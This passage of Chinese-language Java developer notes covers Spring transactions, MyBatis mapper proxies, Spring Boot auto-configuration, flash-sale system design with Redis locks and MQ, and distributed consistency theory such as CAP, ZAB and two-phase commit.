			this.earlySingletonObjects.remove(beanName);
			this.registeredSingletons.add(beanName);
		}
	}
```



#### 二级缓存能解决吗

需要三级缓存的意义在于所需要的类可能是进行代理的代理对象，当向三级缓存中放置匿名内部类，可以在获取的时候决定到底是简单对象还是代理对象，这就是三级缓存的意义





### 事务传播行为

> 为了解决业务层方法之间互相调用的事务问题

**`@Transactional` 的常用配置参数总结（只列出了 5 个我平时比较常用的）：**

| 属性名      | 说明                                                         |
| :---------- | :----------------------------------------------------------- |
| propagation | 事务的传播行为，默认值为 REQUIRED，可选的值在上面介绍过      |
| isolation   | 事务的隔离级别，默认值采用 DEFAULT，可选的值在上面介绍过     |
| timeout     | 事务的超时时间，默认值为-1（不会超时）。如果超过该时间限制但事务还没有完成，则自动回滚事务。 |
| readOnly    | 指定事务是否为只读事务，默认值为 false。                     |
| rollbackFor | 用于指定能够触发事务回滚的异常类型，并且可以指定多个异常类型 |



其中propagation规定了事务的传播行为

**`TransactionDefinition.PROPAGATION_REQUIRED`**

***默认的传播行为***，如果当前存在事务，加入该事务，如果不存在，自己创一个新事务，比如b有事务，调用了a，那么a跟b用同一个事务，如果b没有，a就创建一个新事务



**`TransactionDefinition.PROPAGATION_REQUIRES_NEW`**

当前存在事务，把当前事务挂起，自己另外新建一个。互相不影响，但是如果新事务抛出了异常，且异常刚好被上层事务捕捉的话，上层事务也会回滚



**`TransactionDefinition.PROPAGATION_NESTED`**

与上一个类似，但它创建事务是嵌套于上一层事务的

![img](java.assets/777.png)



##### 事务问题

避免自调用，也就是同一类中调用方法

比如下面method1调用了mehod2，导致了method2的事务失效，原因是spring aop导致的

解决办法要不就是不再同一类中调用方法，要不就是换成AspectJ

```java
@Service
public class MyService {

private void method1() {
     method2();
     //......
}
@Transactional
 public void method2() {
     //......
  }
}

```



## Mybatis

### mapper如何自动实现子类

mybatis底层是通过代理来实现的

具体实现FactoryBean自定义bean的属性，可以看到是调用了getMapper方法

```java
public class MapperFactoryBean<T> extends SqlSessionDaoSupport implements FactoryBean<T> {
  public T getObject() throws Exception {
        return this.getSqlSession().getMapper(this.mapperInterface);
    }
}
```

getMapper逻辑里看到一个map对象映射了class类型和代理工厂，每个class对象都有一个代理工厂

根据代理工厂来创建对象

```java
public class MybatisMapperRegistry extends MapperRegistry {

    private final Configuration config;
    private final Map<Class<?>, MybatisMapperProxyFactory<?>> knownMappers = new HashMap<>();
     @Override
    public <T> T getMapper(Class<T> type, SqlSession sqlSession) {
        // TODO 这里换成 MybatisMapperProxyFactory 而不是 MapperProxyFactory
        final MybatisMapperProxyFactory<T> mapperProxyFactory = (MybatisMapperProxyFactory<T>) knownMappers.get(type);
        if (mapperProxyFactory == null) {
            throw new BindingException("Type " + type + " is not known to the MybatisPlusMapperRegistry.");
        }
        try {
            return mapperProxyFactory.newInstance(sqlSession);
        } catch (Exception e) {
            throw new BindingException("Error getting mapper instance. Cause: " + e, e);
        }
    }
    }
```

代理工厂会封装一个mybatismapperProxy对象，然后用jdk代理创建代理对象

```
@SuppressWarnings("unchecked")
protected T newInstance(MybatisMapperProxy<T> mapperProxy) {
    return (T) Proxy.newProxyInstance(mapperInterface.getClassLoader(), new Class[]{mapperInterface}, mapperProxy);
}

public T newInstance(SqlSession sqlSession) {
    final MybatisMapperProxy<T> mapperProxy = new MybatisMapperProxy<>(sqlSession, mapperInterface, methodCache);
    return newInstance(mapperProxy);
}
```

实际上mybatismapperProxy该对象实现了InovacationHandler

```java
public class MybatisMapperProxy<T> implements InvocationHandler, Serializable {
  	@Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        try {
            if (Object.class.equals(method.getDeclaringClass())) {
                return method.invoke(this, args);
            } else {
                return cachedInvoker(method).invoke(proxy, method, args, sqlSession);
            }
        } catch (Throwable t) {
            throw ExceptionUtil.unwrapThrowable(t);
        }
    }
}
```

## mysql

mysql索引没有使用二叉树，因为碰到顺序元素会退化为链表

也没有采用红黑树，因为红黑树是二插，深度太高了

mysql底层使用的是b树，实际是b+树，叶节点存了实际的数据

![1647911375949](java.assets/1647911375949.png)



## SpringBoot

#### pom关系

![img](java.assets/images?url=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F75dec7fcb47b1492794b1a38e176a79c.webp%3Fx-oss-process%3Dimage%2Fformat%2Cpng&sign=a35c11962b4506bbe1e789b0d581db06a52a7e71f9ecca88247ffc1923caf36e)









#### 自动装配

问题

> 什么是自动装配
>
> 怎么实现自动装配，如何实现按需加载

springboot通过`@SpringBootApplication`注解导入了`@EnableAutoConfiguration`注解

又`@import`了下面的类

```java
@Import({AutoConfigurationImportSelector.class})
public @interface EnableAutoConfiguration {
    String ENABLED_OVERRIDE_PROPERTY = "spring.boot.enableautoconfiguration";

    Class<?>[] exclude() default {};

    String[] excludeName() default {};
}
```

往该`AutoConfigurationImportSelector`下面查看会发现它其实就是去查看 META-INF/spring.factories下面的`EnableAutoConfiguration`对应的值然后添加进来，本质类似于我们的Dubbo的SPI机制

```java
protected List<String> getCandidateConfigurations(AnnotationMetadata metadata, AnnotationAttributes attributes) {
   List<String> configurations = SpringFactoriesLoader.loadFactoryNames(getSpringFactoriesLoaderFactoryClass(),
         getBeanClassLoader());
   Assert.notEmpty(configurations, "No auto configuration classes found in META-INF/spring.factories. If you "
         + "are using a custom packaging, make sure that file is correct.");
   return configurations;
}
```

最后会需要过滤掉一些不符合条件的类，通过`AutoConfigurationImportFilter`，比如使用了如下注解的

- `@ConditionalOnBean`：当容器里有指定 Bean 的条件下
- `@ConditionalOnMissingBean`：当容器里没有指定 Bean 的情况下
- `@ConditionalOnSingleCandidate`：当指定 Bean 在容器中只有一个，或者虽然有多个但是指定首选 Bean

当前加入的类使用了`@ConditionalOnBean`如果过滤器发现该注解里面加入的类不存在在容器中，那么久不会导入该类了





##### Condition接口

Condition是所有Condition的父接口，定义了一个match方法，该方法如果返回true就会让被`@Conditional`注解修辞的类加入到容器中

```java
@FunctionalInterface
public interface Condition {
	boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata);
}
```

我们点击OnClassCondition就是实际实现了Condition接口的类，并且做了判断该类能否加入容器

```java
@Documented
@Conditional(OnClassCondition.class)
public @interface ConditionalOnClass {
```

下面是该类的继承关系

![Snip20220422_16](java.assets/Snip20220422_16.png)



可以看到`Condition`接口被`SpringBootCondition`实现，从该类开始，他对子类隐藏了`match`方法，而只提供了模版方法`getMatchOutcome`，父类`match`会调用`getMatchOutcome`，返回`ContionOutCome`类，由他来保存是否`match`的结果

```java
protected final boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata, Condition condition) {
		if (condition instanceof SpringBootCondition) {
			return ((SpringBootCondition) condition).getMatchOutcome(context, metadata).isMatch();
		}
		return condition.matches(context, metadata);
	}
```



那么match方法多久被调用的呢，根据调用栈会看到是由ConditionEvaluator类的shouldSkip方法来调用的

```java
public boolean shouldSkip(@Nullable AnnotatedTypeMetadata metadata, @Nullable ConfigurationPhase phase) {
		if (metadata == null || !metadata.isAnnotated(Conditional.class.getName())) {
			return false;
		}
		for (Condition condition : conditions) {
			ConfigurationPhase requiredPhase = null;
			if (condition instanceof ConfigurationCondition) {
				requiredPhase = ((ConfigurationCondition) condition).getConfigurationPhase();
			}
			if ((requiredPhase == null || requiredPhase == phase) && !condition.matches(this.context, metadata)) {
				return true;
			}
		}

		return false;
	}
```



#### 参数校验

如果需要自定义参数校验

1. 需要先实现参数注解
2. 并且实现`ConstraintValidator`接口就可以正常使用了




## 秒杀

面试必考：秒杀系统要如何设计？



高并发下如何设计秒杀系统？这是一个高频面试题。这个问题看似简单，但是里面的水很深，它考查的是高并发场景下，从前端到后端多方面的知识。

秒杀一般出现在商城的促销活动中，指定了一定数量（比如：10个）的商品（比如：手机），以极低的价格（比如：0.1元），让大量用户参与活动，但只有极少数用户能够购买成功。这类活动商家绝大部分是不赚钱的，说白了是找个噱头宣传自己。

虽说秒杀只是一个促销活动，但对技术要求不低。下面给大家总结一下设计秒杀系统需要注意的9个细节。

### 1 瞬时高并发

一般在秒杀时间点（比如：12点）前几分钟，用户并发量才真正突增，达到秒杀时间点时，并发量会达到顶峰。

但由于这类活动是大量用户抢少量商品的场景，必定会出现狼多肉少的情况，所以其实绝大部分用户秒杀会失败，只有极少部分用户能够成功。

正常情况下，大部分用户会收到商品已经抢完的提醒，收到该提醒后，他们大概率不会在那个活动页面停留了，如此一来，用户并发量又会急剧下降。所以这个峰值持续的时间其实是非常短的，这样就会出现瞬时高并发的情况，下面用一张图直观的感受一下流量的变化：


像这种瞬时高并发的场景，传统的系统很难应对，我们需要设计一套全新的系统。可以从以下几个方面入手：

![图片](java.assets/894dc42dfb42ad4e636d9683b4e2a20a9aa6526e.png@942w_489h_progressive.png)

页面静态化



CDN加速



缓存



mq异步处理



限流



分布式锁

2. ### 页面静态化

活动页面是用户流量的第一入口，所以是并发量最大的地方。

如果这些流量都能直接访问服务端，恐怕服务端会因为承受不住这么大的压力，而直接挂掉。

![图片](java.assets/66d609c4bb4da2c3c0d44fc3f921a91fa468d05d.png@942w_312h_progressive.png)

活动页面绝大多数内容是固定的，比如：商品名称、商品描述、图片等。为了减少不必要的服务端请求，通常情况下，会对活动页面做静态化处理。用户浏览商品等常规操作，并不会请求到服务端。只有到了秒杀时间点，并且用户主动点了秒杀按钮才允许访问服务端。

![图片](java.assets/30249b7be527a80cafa285e7f7d52b49dba9000c.png@942w_282h_progressive.png)


这样能过滤大部分无效请求。

但只做页面静态化还不够，因为用户分布在全国各地，有些人在北京，有些人在成都，有些人在深圳，地域相差很远，网速各不相同。

如何才能让用户最快访问到活动页面呢？

这就需要使用CDN，它的全称是Content Delivery Network，即内容分发网络。




使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。

### 3 秒杀按钮

大部分用户怕错过秒杀时间点，一般会提前进入活动页面。此时看到的秒杀按钮是置灰，不可点击的。只有到了秒杀时间点那一时刻，秒杀按钮才会自动点亮，变成可点击的。

但此时很多用户已经迫不及待了，通过不停刷新页面，争取在第一时间看到秒杀按钮的点亮。

从前面得知，该活动页面是静态的。那么我们在静态页面中如何控制秒杀按钮，只在秒杀时间点时才点亮呢？

没错，使用js文件控制。

为了性能考虑，一般会将css、js和图片等静态资源文件提前缓存到CDN上，让用户能够就近访问秒杀页面。

看到这里，有些聪明的小伙伴，可能会问：CDN上的js文件是如何更新的？

秒杀开始之前，js标志为false，还有另外一个随机参数。


当秒杀开始的时候系统会生成一个新的js文件，此时标志为true，并且随机参数生成一个新值，然后同步给CDN。由于有了这个随机参数，CDN不会缓存数据，每次都能从CDN中获取最新的js代码。


此外，前端还可以加一个定时器，控制比如：10秒之内，只允许发起一次请求。如果用户点击了一次秒杀按钮，则在10秒之内置灰，不允许再次点击，等到过了时间限制，又允许重新点击该按钮。

### 4 读多写少

在秒杀的过程中，系统一般会先查一下库存是否足够，如果足够才允许下单，写数据库。如果不够，则直接返回该商品已经抢完。

由于大量用户抢少量商品，只有极少部分用户能够抢成功，所以绝大部分用户在秒杀时，库存其实是不足的，系统会直接返回该商品已经抢完。

![图片](java.assets/562e57e725145ccc426dc6763fc7e3eee04aa14c.png@879w_1263h_progressive.png)

这是非常典型的：读多写少 的场景。


如果有数十万的请求过来，同时通过数据库查缓存是否足够，此时数据库可能会挂掉。因为数据库的连接资源非常有限，比如：mysql，无法同时支持这么多的连接。

而应该改用缓存，比如：redis。

即便用了redis，也需要部署多个节点。

### 5 缓存问题

通常情况下，我们需要在redis中保存商品信息，里面包含：商品id、商品名称、规格属性、库存等信息，同时数据库中也要有相关信息，毕竟缓存并不完全可靠。

用户在点击秒杀按钮，请求秒杀接口的过程中，需要传入的商品id参数，然后服务端需要校验该商品是否合法。

大致流程如下图所示：


根据商品id，先从缓存中查询商品，如果商品存在，则参与秒杀。如果不存在，则需要从数据库中查询商品，如果存在，则将商品信息放入缓存，然后参与秒杀。如果商品不存在，则直接提示失败。

这个过程表面上看起来是OK的，但是如果深入分析一下会发现一些问题。

#### 5.1 缓存击穿

比如商品A第一次秒杀时，缓存中是没有数据的，但数据库中有。虽说上面有如果从数据库中查到数据，则放入缓存的逻辑。

然而，在高并发下，同一时刻会有大量的请求，都在秒杀同一件商品，这些请求同时去查缓存中没有数据，然后又同时访问数据库。结果悲剧了，数据库可能扛不住压力，直接挂掉。

如何解决这个问题呢？

这就需要加锁，最好使用分布式锁。

![图片](java.assets/73a439d8618a053e4eccc4e59ff52e0323d4ec5a.png@942w_528h_progressive.png)


当然，针对这种情况，最好在项目启动之前，先把缓存进行预热。即事先把所有的商品，同步到缓存中，这样商品基本都能直接从缓存中获取到，就不会出现缓存击穿的问题了。

是不是上面加锁这一步可以不需要了？

表面上看起来，确实可以不需要。但如果缓存中设置的过期时间不对，缓存提前过期了，或者缓存被不小心删除了，如果不加速同样可能出现缓存击穿。

其实这里加锁，相当于买了一份保险。

#### 5.2 缓存穿透

如果有大量的请求传入的商品id，在缓存中和数据库中都不存在，这些请求不就每次都会穿透过缓存，而直接访问数据库了。

由于前面已经加了锁，所以即使这里的并发量很大，也不会导致数据库直接挂掉。

但很显然这些请求的处理性能并不好，有没有更好的解决方案？

这时可以想到布隆过滤器。

![图片](java.assets/b2c7632c5689103438d421e7b5c50f425a7de959.png@924w_996h_progressive.png)


系统根据商品id，先从布隆过滤器中查询该id是否存在，如果存在则允许从缓存中查询数据，如果不存在，则直接返回失败。

虽说该方案可以解决缓存穿透问题，但是又会引出另外一个问题：布隆过滤器中的数据如何更缓存中的数据保持一致？

这就要求，如果缓存中数据有更新，则要及时同步到布隆过滤器中。如果数据同步失败了，还需要增加重试机制，而且跨数据源，能保证数据的实时一致性吗？

显然是不行的。

所以布隆过滤器绝大部分使用在缓存数据更新很少的场景中。

如果缓存数据更新非常频繁，又该如何处理呢？

这时，就需要把不存在的商品id也缓存起来。


下次，再有该商品id的请求过来，则也能从缓存中查到数据，只不过该数据比较特殊，表示商品不存在。需要特别注意的是，这种特殊缓存设置的超时时间应该尽量短一点。

### 6 库存问题

对于库存问题看似简单，实则里面还是有些东西。

真正的秒杀商品的场景，不是说扣完库存，就完事了，如果用户在一段时间内，还没完成支付，扣减的库存是要加回去的。

所以，在这里引出了一个预扣库存的概念，预扣库存的主要流程如下：

![图片](java.assets/a21e81f9a1999254640fc89139e188a4006a5b4c.png@930w_1179h_progressive.png)


扣减库存中除了上面说到的预扣库存和回退库存之外，还需要特别注意的是库存不足和库存超卖问题。

#### 6.1 数据库扣减库存

使用数据库扣减库存，是最简单的实现方案了，假设扣减库存的sql如下：

update product set stock=stock-1 where id=123;

这种写法对于扣减库存是没有问题的，但如何控制库存不足的情况下，不让用户操作呢？

这就需要在update之前，先查一下库存是否足够了。

伪代码如下：

int stock = mapper.getStockById(123); if(stock > 0) {   int count = mapper.updateStock(123);   if(count > 0) {     addOrder(123);   } }

大家有没有发现这段代码的问题？

没错，查询操作和更新操作不是原子性的，会导致在并发的场景下，出现库存超卖的情况。

有人可能会说，这样好办，加把锁，不就搞定了，比如使用synchronized关键字。

确实，可以，但是性能不够好。

还有更优雅的处理方案，即基于数据库的乐观锁，这样会少一次数据库查询，而且能够天然的保证数据操作的原子性。

只需将上面的sql稍微调整一下：

update product set stock=stock-1 where id=product and stock > 0;

在sql最后加上：stock > 0，就能保证不会出现超卖的情况。

但需要频繁访问数据库，我们都知道数据库连接是非常昂贵的资源。在高并发的场景下，可能会造成系统雪崩。而且，容易出现多个请求，同时竞争行锁的情况，造成相互等待，从而出现死锁的问题。

#### 6.2 redis扣减库存

redis的incr方法是原子性的，可以用该方法扣减库存。伪代码如下：

boolean exist = redisClient.query(productId,userId);   if(exist) {     return -1;   }   int stock = redisClient.queryStock(productId);   if(stock <=0) {     return 0;   }   redisClient.incrby(productId, -1);   redisClient.add(productId,userId); return 1;

代码流程如下：



先判断该用户有没有秒杀过该商品，如果已经秒杀过，则直接返回-1。



查询库存，如果库存小于等于0，则直接返回0，表示库存不足。



如果库存充足，则扣减库存，然后将本次秒杀记录保存起来。然后返回1，表示成功。

估计很多小伙伴，一开始都会按这样的思路写代码。但如果仔细想想会发现，这段代码有问题。

有什么问题呢？

如果在高并发下，有多个请求同时查询库存，当时都大于0。由于查询库存和更新库存非原则操作，则会出现库存为负数的情况，即库存超卖。

当然有人可能会说，加个synchronized不就解决问题？

调整后代码如下：

   boolean exist = redisClient.query(productId,userId);    if(exist) {     return -1;    }    synchronized(this) {        int stock = redisClient.queryStock(productId);        if(stock <=0) {          return 0;        }        redisClient.incrby(productId, -1);        redisClient.add(productId,userId);    } return 1;

加synchronized确实能解决库存为负数问题，但是这样会导致接口性能急剧下降，每次查询都需要竞争同一把锁，显然不太合理。

为了解决上面的问题，代码优化如下：

boolean exist = redisClient.query(productId,userId); if(exist) {   return -1; } if(redisClient.incrby(productId, -1)<0) {   return 0; } redisClient.add(productId,userId); return 1;

该代码主要流程如下：



先判断该用户有没有秒杀过该商品，如果已经秒杀过，则直接返回-1。



扣减库存，判断返回值是否小于0，如果小于0，则直接返回0，表示库存不足。



如果扣减库存后，返回值大于或等于0，则将本次秒杀记录保存起来。然后返回1，表示成功。

该方案咋一看，好像没问题。

但如果在高并发场景中，有多个请求同时扣减库存，大多数请求的incrby操作之后，结果都会小于0。

虽说，库存出现负数，不会出现超卖的问题。但由于这里是预减库存，如果负数值负的太多的话，后面万一要回退库存时，就会导致库存不准。

那么，有没有更好的方案呢？

#### 6.3 lua脚本扣减库存

我们都知道lua脚本，是能够保证原子性的，它跟redis一起配合使用，能够完美解决上面的问题。

lua脚本有段非常经典的代码：

```lua
StringBuilder lua = new StringBuilder();   lua.append("if (redis.call('exists', KEYS[1]) == 1) then");   lua.append("    local stock = tonumber(redis.call('get', KEYS[1]));");   lua.append("    if (stock == -1) then");   lua.append("        return 1;");   lua.append("    end;");   lua.append("    if (stock > 0) then");   lua.append("        redis.call('incrby', KEYS[1], -1);");   lua.append("        return stock;");   lua.append("    end;");   lua.append("    return 0;");   lua.append("end;");   lua.append("return -1;");
```

  

该代码的主要流程如下：



先判断商品id是否存在，如果不存在则直接返回。



获取该商品id的库存，判断库存如果是-1，则直接返回，表示不限制库存。



如果库存大于0，则扣减库存。



如果库存等于0，是直接返回，表示库存不足。

### 7 分布式锁

之前我提到过，在秒杀的时候，需要先从缓存中查商品是否存在，如果不存在，则会从数据库中查商品。如果数据库中，则将该商品放入缓存中，然后返回。如果数据库中没有，则直接返回失败。

大家试想一下，如果在高并发下，有大量的请求都去查一个缓存中不存在的商品，这些请求都会直接打到数据库。数据库由于承受不住压力，而直接挂掉。

那么如何解决这个问题呢？

这就需要用redis分布式锁了。

#### 7.1 setNx加锁

使用redis的分布式锁，首先想到的是setNx命令。

if (jedis.setnx(lockKey, val) == 1) {    jedis.expire(lockKey, timeout); }

用该命令其实可以加锁，但和后面的设置超时时间是分开的，并非原子操作。

假如加锁成功了，但是设置超时时间失败了，该lockKey就变成永不失效的了。在高并发场景中，该问题会导致非常严重的后果。

那么，有没有保证原子性的加锁命令呢？

#### 7.2 set加锁

使用redis的set命令，它可以指定多个参数。

String result = jedis.set(lockKey, requestId, "NX", "PX", expireTime); if ("OK".equals(result)) {     return true; } return false;

其中：



lockKey：锁的标识



requestId：请求id



NX：只在键不存在时，才对键进行设置操作。



PX：设置键的过期时间为 millisecond 毫秒。



expireTime：过期时间

由于该命令只有一步，所以它是原子操作。

#### 7.3 释放锁

接下来，有些朋友可能会问：在加锁时，既然已经有了lockKey锁标识，为什么要需要记录requestId呢？

答：requestId是在释放锁的时候用的。

if (jedis.get(lockKey).equals(requestId)) {     jedis.del(lockKey);     return true; } return false;

在释放锁的时候，只能释放自己加的锁，不允许释放别人加的锁。

这里为什么要用requestId，用userId不行吗？

答：如果用userId的话，假设本次请求流程走完了，准备删除锁。此时，巧合锁到了过期时间失效了。而另外一个请求，巧合使用的相同userId加锁，会成功。而本次请求删除锁的时候，删除的其实是别人的锁了。

当然使用lua脚本也能避免该问题：

if redis.call('get', KEYS[1]) == ARGV[1] then   return redis.call('del', KEYS[1])  else    return 0  end 复制代码

它能保证查询锁是否存在和删除锁是原子操作。

#### 7.4 自旋锁

上面的加锁方法看起来好像没有问题，但如果你仔细想想，如果有1万的请求同时去竞争那把锁，可能只有一个请求是成功的，其余的9999个请求都会失败。

在秒杀场景下，会有什么问题？

答：每1万个请求，有1个成功。再1万个请求，有1个成功。如此下去，直到库存不足。这就变成均匀分布的秒杀了，跟我们想象中的不一样。

如何解决这个问题呢？

答：使用自旋锁。

try {   Long start = System.currentTimeMillis();   while(true) {       String result = jedis.set(lockKey, requestId, "NX", "PX", expireTime);      if ("OK".equals(result)) {         return true;      }            long time = System.currentTimeMillis() - start;       if (time>=timeout) {           return false;       }       try {           Thread.sleep(50);       } catch (InterruptedException e) {           e.printStackTrace();       }   }   } finally{     unlock(lockKey,requestId); }   return false;

在规定的时间，比如500毫秒内，自旋不断尝试加锁，如果成功则直接返回。如果失败，则休眠50毫秒，再发起新一轮的尝试。如果到了超时时间，还未加锁成功，则直接返回失败。

#### 7.5 redisson

除了上面的问题之外，使用redis分布式锁，还有锁竞争问题、续期问题、锁重入问题、多个redis实例加锁问题等。

这些问题使用redisson可以解决，由于篇幅的原因，在这里先保留一点悬念，有疑问的私聊给我。后面会出一个专题介绍分布式锁，敬请期待。

### 8 mq异步处理

我们都知道在真实的秒杀场景中，有三个核心流程：


而这三个核心流程中，真正并发量大的是秒杀功能，下单和支付功能实际并发量很小。所以，我们在设计秒杀系统时，有必要把下单和支付功能从秒杀的主流程中拆分出来，特别是下单功能要做成mq异步处理的。而支付功能，比如支付宝支付，是业务场景本身保证的异步。

于是，秒杀后下单的流程变成如下：


如果使用mq，需要关注以下几个问题：

### 8.1 消息丢失问题

秒杀成功了，往mq发送下单消息的时候，有可能会失败。原因有很多，比如：网络问题、broker挂了、mq服务端磁盘问题等。这些情况，都可能会造成消息丢失。

那么，如何防止消息丢失呢？

答：加一张消息发送表。

![图片](java.assets/499c2e2396a1a89271c674dbe09a7ffd179f1f77.png@942w_542h_progressive-20220329160400955.png)


在生产者发送mq消息之前，先把该条消息写入消息发送表，初始状态是待处理，然后再发送mq消息。消费者消费消息时，处理完业务逻辑之后，再回调生产者的一个接口，修改消息状态为已处理。

如果生产者把消息写入消息发送表之后，再发送mq消息到mq服务端的过程中失败了，造成了消息丢失。

这时候，要如何处理呢？

答：使用job，增加重试机制。

![图片](java.assets/9dae7ea891ea1382e7d545b7d9a67201be268eac.png@942w_300h_progressive.png)


用job每隔一段时间去查询消息发送表中状态为待处理的数据，然后重新发送mq消息。

### 8.2 重复消费问题

本来消费者消费消息时，在ack应答的时候，如果网络超时，本身就可能会消费重复的消息。但由于消息发送者增加了重试机制，会导致消费者重复消息的概率增大。

那么，如何解决重复消息问题呢？

答：加一张消息处理表。

![图片](java.assets/499c2e2396a1a89271c674dbe09a7ffd179f1f77.png@942w_542h_progressive.png)


消费者读到消息之后，先判断一下消息处理表，是否存在该消息，如果存在，表示是重复消费，则直接返回。如果不存在，则进行下单操作，接着将该消息写入消息处理表中，再返回。

有个比较关键的点是：下单和写消息处理表，要放在同一个事务中，保证原子操作。

### 8.3 垃圾消息问题

这套方案表面上看起来没有问题，但如果出现了消息消费失败的情况。比如：由于某些原因，消息消费者下单一直失败，一直不能回调状态变更接口，这样job会不停的重试发消息。最后，会产生大量的垃圾消息。

那么，如何解决这个问题呢？

每次在job重试时，需要先判断一下消息发送表中该消息的发送次数是否达到最大限制，如果达到了，则直接返回。如果没有达到，则将次数加1，然后发送消息。

这样如果出现异常，只会产生少量的垃圾消息，不会影响到正常的业务。

### 8.4 延迟消费问题

通常情况下，如果用户秒杀成功了，下单之后，在15分钟之内还未完成支付的话，该订单会被自动取消，回退库存。

那么，在15分钟内未完成支付，订单被自动取消的功能，要如何实现呢？

我们首先想到的可能是job，因为它比较简单。

但job有个问题，需要每隔一段时间处理一次，实时性不太好。

还有更好的方案？

答：使用延迟队列。

我们都知道rocketmq，自带了延迟队列的功能。

下单时消息生产者会先生成订单，此时状态为待支付，然后会向延迟队列中发一条消息。达到了延迟时间，消息消费者读取消息之后，会查询该订单的状态是否为待支付。如果是待支付状态，则会更新订单状态为取消状态。如果不是待支付状态，说明该订单已经支付过了，则直接返回。

还有个关键点，用户完成支付之后，会修改订单状态为已支付。

### 9 如何限流？

通过秒杀活动，如果我们运气爆棚，可能会用非常低的价格买到不错的商品（这种概率堪比买福利彩票中大奖）。

但有些高手，并不会像我们一样老老实实，通过秒杀页面点击秒杀按钮，抢购商品。他们可能在自己的服务器上，模拟正常用户登录系统，跳过秒杀页面，直接调用秒杀接口。

如果是我们手动操作，一般情况下，一秒钟只能点击一次秒杀按钮。

但是如果是服务器，一秒钟可以请求成上千接口。

这种差距实在太明显了，如果不做任何限制，绝大部分商品可能是被机器抢到，而非正常的用户，有点不太公平。

所以，我们有必要识别这些非法请求，做一些限制。那么，我们该如何现在这些非法请求呢？

目前有两种常用的限流方式：



基于nginx限流



基于redis限流

#### 9.1 对同一用户限流

为了防止某个用户，请求接口次数过于频繁，可以只针对该用户做限制。

限制同一个用户id，比如每分钟只能请求5次接口。

#### 9.2 对同一ip限流

有时候只对某个用户限流是不够的，有些高手可以模拟多个用户请求，这种nginx就没法识别了。

这时需要加同一ip限流功能。

限制同一个ip，比如每分钟只能请求5次接口。

但这种限流方式可能会有误杀的情况，比如同一个公司或网吧的出口ip是相同的，如果里面有多个正常用户同时发起请求，有些用户可能会被限制住。

#### 9.3 对接口限流

别以为限制了用户和ip就万事大吉，有些高手甚至可以使用代理，每次都请求都换一个ip。

这时可以限制请求的接口总次数。

在高并发场景下，这种限制对于系统的稳定性是非常有必要的。但可能由于有些非法请求次数太多，达到了该接口的请求上限，而影响其他的正常用户访问该接口。看起来有点得不偿失。

#### 9.4 加验证码

相对于上面三种方式，加验证码的方式可能更精准一些，同样能限制用户的访问频次，但好处是不会存在误杀的情况。

通常情况下，用户在请求之前，需要先输入验证码。用户发起请求之后，服务端会去校验该验证码是否正确。只有正确才允许进行下一步操作，否则直接返回，并且提示验证码错误。

此外，验证码一般是一次性的，同一个验证码只允许使用一次，不允许重复使用。

普通验证码，由于生成的数字或者图案比较简单，可能会被破解。优点是生成速度比较快，缺点是有安全隐患。

还有一个验证码叫做：移动滑块，它生成速度比较慢，但比较安全，是目前各大互联网公司的首选。

#### 9.5 提高业务门槛

上面说的加验证码虽然可以限制非法用户请求，但是有些影响用户体验。用户点击秒杀按钮前，还要先输入验证码，流程显得有点繁琐，秒杀功能的流程不是应该越简单越好吗？

其实，有时候达到某个目的，不一定非要通过技术手段，通过业务手段也一样。

12306刚开始的时候，全国人民都在同一时刻抢火车票，由于并发量太大，系统经常挂。后来，重构优化之后，将购买周期放长了，可以提前20天购买火车票，并且可以在9点、10、11点、12点等整点购买火车票。调整业务之后（当然技术也有很多调整），将之前集中的请求，分散开了，一下子降低了用户并发量。

回到这里，我们通过提高业务门槛，比如只有会员才能参与秒杀活动，普通注册用户没有权限。或者，只有等级到达3级以上的普通用户，才有资格参加该活动。

这样简单的提高一点门槛，即使是黄牛党也束手无策，他们总不可能为了参加一次秒杀活动，还另外花钱充值会员吧？





# 分布式

## 分布式锁

在分不锁的情况下，能保证多机、多进程多线程访问资源的一致性，这个时候还需要进程内部的jvm锁吗？

需要：限流



两大类分布式锁：

- 类cas自旋式分布式锁 询问的方式尝试加锁；如Mysql、Redis
- event事件通知后续锁的变化，如Zookeeper
  - zookeeper通过watcher机制可以回调客户端的方法





## 分布式id

### 雪花算法

![img](java.assets/1021.jpeg)

>>>>>>> Stashed changes



## 经典理论

### CAP

> 一致性、可用性和分区容错性
>
> 当网络分区出现的时候，如果要继续服务，只能在一致性和可用性中进行选择
>
> 所以出现了两种方案AP（Eureka）和CP（Zookeeper）

![图片](java.assets/640-20220421203902568.png)

### BASE

> 在一致性上的妥协
>
> 即使无法做到强一致性，也要采取适当的方法使系统达到最终一致性
>
> 具体来说是AP方案的补充

![图片](java.assets/640-20220421204333390.png)



### ZAB

zookeeper为了解决分布式一致性提出的协议

主要角色：

1. leader：集群中唯一写请求处理者，能够发起投票
2. follower：能够接受客户端请求，如果是读请求可以自己处理，写请求转发给leader
3. observer：没有选举权和被选举权的follower



#### 消息广播模式

为了能顺利传播消息

zookeeper维护了两个队列。队列保证了消息的接受是根据顺序来发送给每个follower的

![消息广播](java.assets/08ccce48190fe4edcbcbb223d6231876.png)

同时zookeeper还定义了一个**ZXID**，他是一个64位long型，高32位位epoch年代，低32位代表事务id，epoch根据leader变化而变化

proposal根据**ZXID**来进行排序



#### 崩溃恢复

当zookeeper的leader挂掉后，需要选举新的leader

1. 集群进入LOOKIng状态，每个follower给自己投票，并发送自己的myid和ZXID
2. follower收到其他人的投票后根据ZXID判断，如果比自己大那么转而给相应的投票
3. 直到某一个follower掌握了超过一半的投票数量



**上面有个问题在于，怎么保证集群的数据一致性**

分为两种：1、确保已经被Leader提交的提案能够被所有follower提交；2、确保跳过被丢弃的提案





## 分布式事务

> 终极目标保证系统中多个相关的数据库的数据一致性



分类上分为柔性事务和刚性事务

1. 柔性事务：追求最终一致性，基于BASE理论
   1. 典型有**TCC、Saga**
2. 刚性事务：追求强一致性
   1. 典型有2阶段、3阶段提交



### 2阶段

> 分为Prepare和Commit

准备阶段询问事务参与者执行本地事务是否成功

提交阶段询问事务参与者提交事务是否成功

![image.png](java.assets/1632404100842-e72c3653-24ac-4c5c-a8ca-ccc15bcb66e0.png)

当任意一个事务参与者失败后，所有事务参与者回滚



#### 缺点：

1. 单点故障，协调者挂掉
2. 数据不一致性。某个参与者未收到提交命令，挂掉了，其他事务都提交了，当他恢复的时候就回滚了，导致与其他数据不一样



